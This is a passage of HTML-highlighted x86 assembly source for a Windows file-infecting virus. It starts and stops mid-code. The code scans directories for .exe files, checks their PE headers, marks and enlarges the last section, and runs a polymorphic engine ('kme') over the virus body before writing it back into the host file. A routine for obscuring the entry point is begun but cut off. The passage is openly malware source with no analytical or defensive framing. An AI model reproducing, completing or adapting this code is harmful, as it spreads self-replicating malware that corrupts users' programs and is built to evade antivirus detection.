                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'.'</span><span class="sc0">    </span><span class="sc1">; skip ./../etc.</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__next</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">process_directory</span><span class="sc0">

</span><span class="sc5">__next</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">x_FindNextFileA</span><span class="sc4">-</span><span class="sc5">virstart</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">__cycle</span><span class="sc0">

                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">x_FindClose</span><span class="sc4">-</span><span class="sc5">virstart</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">__quit</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc1">; input: EDX=full filename</span><span class="sc0">
</span><span class="sc1">;        EDI=ff_struc</span><span class="sc0">

</span><span class="sc5">process_file</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">pusha</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">__scan0</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">lodsb</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__scan0</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20202000h</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'exe.'</span><span class="sc0">   </span><span class="sc1">; .exe</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__infect</span><span class="sc0">

                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">__infect</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect_file</span><span class="sc0">

                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc1">; input: EDX=fullname</span><span class="sc0">
</span><span class="sc1">;        EDI=ff_struc</span><span class="sc0">
</span><span class="sc1">;        EAX=extension</span><span class="sc0">

</span><span class="sc5">infect_file</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">pusha</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.ff_size</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">256</span><span class="sc4">*</span><span class="sc2">1024</span><span class="sc0">
                        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">__exit</span><span class="sc0">

                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80h</span><span class="sc0">     </span><span class="sc1">; FILE_ATTRIBUTE_NORMAL</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0">       </span><span class="sc1">; 3=OPEN_EXISTING  2=CREATE_ALWAYS</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">     </span><span class="sc1">; 1=FILE_SHARE_READ 2=FILE_SHARE_WRITE</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">080000000h</span><span class="sc4">+</span><span class="sc2">40000000h</span><span class="sc0"> </span><span class="sc1">; GENERIC_READ + GENERIC_WRITE</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">     </span><span class="sc1">; EDX=fname</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">x_CreateFileA</span><span class="sc4">-</span><span class="sc5">virstart</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__exit</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">MAXVIRSIZE</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; size</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">; 0=GMEM_FIXED</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">x_GlobalAlloc</span><span class="sc4">-</span><span class="sc5">virstart</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">                     </span><span class="sc1">; bytesread</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                     </span><span class="sc1">; size</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                     </span><span class="sc1">; buf</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                     </span><span class="sc1">; handle</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">x_ReadFile</span><span class="sc4">-</span><span class="sc5">virstart</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect_real</span><span class="sc0">
                        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">__close</span><span class="sc0">

                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">; FILE_BEGIN</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">x_SetFilePointer</span><span class="sc4">-</span><span class="sc5">virstart</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">                     </span><span class="sc1">; bytesread</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                     </span><span class="sc1">; size</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                     </span><span class="sc1">; buf</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                     </span><span class="sc1">; handle</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">x_WriteFile</span><span class="sc4">-</span><span class="sc5">virstart</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">__close</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">x_GlobalFree</span><span class="sc4">-</span><span class="sc5">virstart</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">x_CloseHandle</span><span class="sc4">-</span><span class="sc5">virstart</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">__exit</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc1">; subroutine.</span><span class="sc0">
</span><span class="sc1">; infects file read into memory.</span><span class="sc0">

</span><span class="sc1">; input:  EDI=buffer with file (max size is ESI+MAXVIRSIZE)</span><span class="sc0">
</span><span class="sc1">;         ESI=file length</span><span class="sc0">
</span><span class="sc1">; output: CF==0 -- infected OK, ESI=new size</span><span class="sc0">
</span><span class="sc1">;         CF==1 -- error</span><span class="sc0">

</span><span class="sc5">infect_real</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">pusha</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.mz_id</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'ZM'</span><span class="sc0">   </span><span class="sc1">; check if MZ file</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__error</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.mz_neptr</span><span class="sc0"> </span><span class="sc1">; EBX = PE header</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.pe_id</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'EP'</span><span class="sc0">   </span><span class="sc1">; check if PE file</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__error</span><span class="sc0">

                        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.pe_exeflags</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2000h</span><span class="sc0"> </span><span class="sc1">; dll ?</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">__error</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.pe_userminor</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__error</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.pe_userminor</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100</span><span class="sc0">

                        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.pe_ntheadersize</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0">

                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

                        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.pe_numofobjects</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">oe_struc</span><span class="sc0">

                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.pe_filealign</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc5">.oe_phys_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc5">.oe_phys_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.pe_objectalign</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc5">.oe_virt_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc5">.oe_virt_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc5">.oe_phys_offs</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc5">.oe_phys_size</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__error</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc5">.oe_phys_size</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc5">.oe_virt_size</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">__error</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__error</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; EAX=kme_outbuf_ptr</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_morph</span><span class="sc0">
                        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">__error</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_uep</span><span class="sc0">
</span><span class="sc1">;                       jc      __error</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MAXVIRSIZE</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.pe_objectalign</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.pe_imagesize</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.pe_sizeofcode</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.pe_stackreservesize</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MAXVIRSIZE</span><span class="sc4">*</span><span class="sc2">16</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.pe_heapreservesize</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">MAXVIRSIZE</span><span class="sc4">*</span><span class="sc2">16</span><span class="sc0">

                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc5">.oe_virt_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MAXVIRSIZE</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.pe_filealign</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc5">.oe_phys_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc5">.popa_esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">__success</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">clc</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">__error</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">stc</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc1">; EBP=inbuf   size=virsize</span><span class="sc0">
</span><span class="sc1">; EAX=outbuf  size=MAXVIRSIZE</span><span class="sc0">

</span><span class="sc5">do_morph</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">pusha</span><span class="sc0">

                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FLAG_NOJMPS</span><span class="sc4">+</span><span class="sc5">FLAG_X_CALLESP</span><span class="sc0"> </span><span class="sc1">; flags</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">CMD_ALL</span><span class="sc0">                 </span><span class="sc1">; cmd mask</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">CMD2_ALL</span><span class="sc4">-</span><span class="sc5">CMD2_FPU</span><span class="sc0">       </span><span class="sc1">; cmd2 mask</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">REG_ALL</span><span class="sc0">                 </span><span class="sc1">; reg mask</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">; jmps if rnd(X)==0</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">; [output eip]</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">; [output size]</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">; output filler</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MAXVIRSIZE</span><span class="sc0">              </span><span class="sc1">; output/max size</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; output buffer</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">virentry</span><span class="sc4">-</span><span class="sc5">virstart</span><span class="sc0">       </span><span class="sc1">; input eip</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">virmemory</span><span class="sc0">               </span><span class="sc1">; input size</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">                     </span><span class="sc1">; input buffer</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">; 0 or pointer to 8 dwords</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">; 0 or pointer to 8 dwords</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">; virus in-file RVA</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">; original entry RVA</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">REG_ALL</span><span class="sc0">                 </span><span class="sc1">; push/pop regs at prolog/epilog</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">x_GetTickCount</span><span class="sc4">-</span><span class="sc5">virstart</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; randseed</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">29Ah</span><span class="sc0">                    </span><span class="sc1">; # of layers ;-)</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">tempbufptr</span><span class="sc4">-</span><span class="sc5">virstart</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; tempbuf</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">kme</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">*</span><span class="sc5">KME_N_ARGS</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">KME_ERROR_SUCCESS</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__error</span><span class="sc0">

                        </span><span class="sc6">clc</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

                        </span><span class="sc1">; should never happen</span><span class="sc0">
</span><span class="sc5">__error</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">stc</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc1">; input: EDI=file buffer ptr</span><span class="sc0">
</span><span class="sc1">;        ESI=size (original, w/o virus)</span><span class="sc0">
</span><span class="sc1">;        ECX=last section objentry</span><span class="sc0">
</span><span class="sc1">;        EBX=pe header</span><span class="sc0">

</span><span class="sc5">do_uep</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">pusha</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc5">.oe_virt_rva</span><span class="sc0">   </span><span class="sc1">; EDI=vir RVA</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc5">.oe_phys_size</span><span class="sc0">

                        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.pe_ntheadersize</span><span class="sc0">
